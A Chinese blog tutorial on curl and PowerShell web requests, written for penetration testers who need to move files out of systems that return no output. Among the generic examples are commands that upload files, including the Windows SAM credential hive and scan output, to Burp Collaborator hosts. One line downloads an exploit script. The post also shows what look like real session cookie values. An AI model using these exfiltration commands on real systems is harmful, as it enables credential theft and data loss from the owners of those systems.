---
title: "curl详解"  # 文章标题
date: 2018-07-15T14:30:00+08:00  # 文章创建日期
draft: false  # 是否为草稿，true 表示草稿，不会在网站上显示
author: "runshell"  # 文章作者
description: "介绍Linux curl命令用法和Windows服务器powershell实现类似功能的方法"  # 文章描述
tags: ["curl"]  # 文章标签
categories: ["网络安全"]  # 文章分类
---



## 0x00 前言

在渗透测试中经常需要在艰难的环境下执行命令，比如没有回显。为了摆脱困境，经常需要传送文件。curl是一个非常厉害的工具，在绝大多数情况下，linux系统中是存在curl的。此外Windows系统中，powershell4.0及其以后的版本中提供了一个cmlet——`Invoke-WebRequest`，其别名之一是curl。所以，简单记录一下curl的用法。

## 0x01 Linux中的curl

### 1.http请求

* **get**

curl 命令后面直接跟url；使用-H指定请求头，每个-H指定一条header；使用 -o 指定输出到具体文件而不是标准输出。

```bash
curl 'https://files.college.360.cn/others/Q1NBQS3lhoXnvZHmuJfpgI_mioDmnK8t56ysMTbor74tU01C5Y2P6K6uLnBkZg==?time=1537360082&sign=5fd0f26e3346e8171e8656caaa42b0fc' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36' -H 'Referer: https://admin.college.360.cn/user/student/course/1032'
```

* **post**

普通表单post，使用-d指定请求体内容。

```bash
curl -d "user=admin&passwd=12345678" http://127.0.0.1:8080/login
```

文件表单post，使用-F指定需要上传的文件。

```bash
curl http://oumchi.burpcollaborator.net -F "6379.txt=@6379.txt"

# 发送出的请求如下：
# POST / HTTP/1.1
# Host: oumchi.burpcollaborator.net
# User-Agent: curl/7.58.0
# Accept: */*
# Content-Length: 1978
# Content-Type: multipart/form-data; boundary=------------------------c9011604f054ee36
# Expect: 100-continue

# --------------------------c9011604f054ee36
# Content-Disposition: form-data; name="6379.txt"; filename="6379.txt"
# Content-Type: text/plain


# Starting Nmap 7.60 ( https://nmap.org ) at 2018-09-01 08:25 UTC
# Stats: 0:01:21 elapsed; 0 hosts completed (64 up), 64 undergoing SYN Stealth Scan
# SYN Stealth Scan Timing: About 3.82% done; ETC: 09:00 (0:34:01 remaining)
# Stats: 0:01:21 elapsed; 0 hosts completed (64 up), 64 undergoing SYN Stealth Scan
# SYN Stealth Scan Timing: About 3.82% done; ETC: 09:00 (0:33:59 remaining)
# Stats: 0:01:21 elapsed; 0 hosts completed (64 up), 64 undergoing SYN Stealth Scan
# SYN Stealth Scan Timing: About 3.83% done; ETC: 09:00 (0:33:55 remaining)

# --------------------------c9011604f054ee36--

```

* put

```bash
curl http://6biy7e.burpcollaborator.net/ -T ca_setup.exe
```

* 其它方法测试

```bash
curl http://www.example.com -X OPTIONS
curl http://www.example.com -X TRACE
...
```

### 2.ftp请求

* **get**

```bash
curl ftp://user:passwd@ftpserver.com:port/path/filename -o filepath
```

* **put**

```bash
curl –u name:passwd -T size.mp3 ftp://www.xxx.com/mp3/
```

* **ls(dir)**

```bash
curl ftp://user:passwd@ftpserver.com:port/path/
```

* **delete**

```bash
curl –u name:passwd ftp://www.xxx.com/ -X 'DELE mp3/size.mp3'
```

### 3.其他

```ba&#39;sh
-u, --user <user:password> 需要口令验证的http或ftp
--ntlm 使用htlm认证
-A, --user-agent <name> 指定请求头中的user-agent字段
--socks5 <host[:port]> 使用sockes5代理
-x, --proxy [protocol://]host[:port] 使用http/https代理
 
--post301       Do not switch to GET after following a 301 不跳转301
--post302       Do not switch to GET after following a 302 不跳转302
--post303       Do not switch to GET after following a 303 不跳转303

```





## 0x02 Windows中的curl

powershell 中的curl是`Invoke-WebRequest`，它的另一个别名是wget。它是使用`-Headers <IDictionary>`来指定请求头，powershell5.x即以前版本可以指定所有请求头，之后的版本UserAgent只能通过`-UserAgent <String>`指定。

```powershell
Invoke-WebRequest [-Uri] <Uri> [-Body <Object>] [-Certificate <X509Certificate>] [-CertificateThumbprint <String>] [-ContentType <String>] [-Credential <PSCredential>
    ] [-DisableKeepAlive] [-Headers <IDictionary>] [-InFile <String>] [-MaximumRedirection <Int32>] [-Method { Default | Get | Head | Post | Put | Delete | Trace | Options
     | Merge | Patch}] [-OutFile <String>] [-PassThru] [-Proxy <Uri>] [-ProxyCredential <PSCredential>] [-ProxyUseDefaultCredentials] [-SessionVariable <String>] [-Timeou
    tSec <Int32>] [-TransferEncoding {chunked | compress | deflate | gzip | identity}] [-UseBasicParsing] [-UseDefaultCredentials] [-UserAgent <String>] [-WebSession <Web
    RequestSession>] [<CommonParameters>]
```

### 1.http

* **get**

使用-UserAgent 指定UA，使用-Headers指定请求头，使用-OutFile指定输出到文件。若不使用-OutFile，将返回一个HtmlWebResponseObject对象，只在屏幕上显示部分摘要信息，若要显示详细信息可以先将其存入变量，再查看变量content等属性。若只想产看响应体，可用管道符传给`write-host`,如`curl ifconfig.me | write-host` 。

```powershell
Invoke-WebRequest -Uri "https://files.college.360.cn/others/Q1NBQS3lhoXnvZHmuJfpgI_mioDmnK8t56ysMTbor74tU01C5Y2P6K6uLnBkZg==?time=1537360082&sign=5fd0f26e3346e8171e8656caaa42b0fc" -Headers @{"Accept"="*/*"; "Referer"="https://admin.college.360.cn"} -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" -OutFile xxx.pdf
```

* **post**

在使用非get方法时必须用-Method指定请求方法；请求体可以用-body指定一个string或其它类型的对象，也可以从本地文件获取内容作为请求体，使用-infile指定本地文件。

```powershell
curl http://lti9gf.burpcollaborator.net -Method post -Body "user=admin&passwd=12345678" 
```

* **put**

如果服务器支持put方法，可以直接put上传文件

```powershell
curl http://lti9gf.burpcollaborator.net -Method put -InFile ‪C:\sam.hive
```

### 2.ftp

似乎只能下载文件

```powershell
curl ftp://user:password@127.0.0.1:21/s2-057.py -outFile s2-057.py
```

## 0x03 net.webclient

在powershell4.0以前没有提供`Invoke-WebRequest`,这时我们可以使用Net.WebClient，它是.NET Framework中的一个类。它的功能更加强大。

```powershell
#ftp下载
(New-Object System.Net.WebClient).downloadfile('ftp://admin:admin@172.28.100.68/ppt.txt','ppt.txt')

#ftp上传
(New-Object System.Net.WebClient).uploadfile('ftp://admin:admin@172.28.100.68/ppt1.txt','ppt.txt')

#http上传
(New-Object System.Net.WebClient).uploadfile('http://8060wg.burpcollaborator.net','ppt.txt')

#http下载文件
(New-Object System.Net.WebClient).downloadfile('http：//172.28.100.68/ppt.txt','ppt.txt')

#下载到内存
$response=(New-Object System.Net.WebClient).downloadstring('http：//172.28.100.68/ppt.txt')#得到string
$response=(New-Object System.Net.WebClient).downloaddata('http：//172.28.100.68/ppt.txt')#得到byte[]
#从内存上传
(New-Object System.Net.WebClient).uploadstring('http://8060wg.burpcollaborator.net',$response)
(New-Object System.Net.WebClient).uploaddata('http://8060wg.burpcollaborator.net',$response)

#指定请求头
$mywebclient=(New-Object System.Net.WebClient);
$mywebclient.Headers.Add("Cookie"," HMACCOUNT=057DAB164B4FC7D1; BAIDUID=3C7BA5C29716B9F251F8BC090E0BF028:FG=1; BIDUPSID=3C7BA5C29716B9F251F8BC090E0BF028; PSTM=1532227383")
$mywebclient.Headers.Add("Referer","https://newtab.firefoxchina.cn/world-tab-index.html")
$mywebclient.downloadstring('http://8060wg.burpcollaborator.net')


```
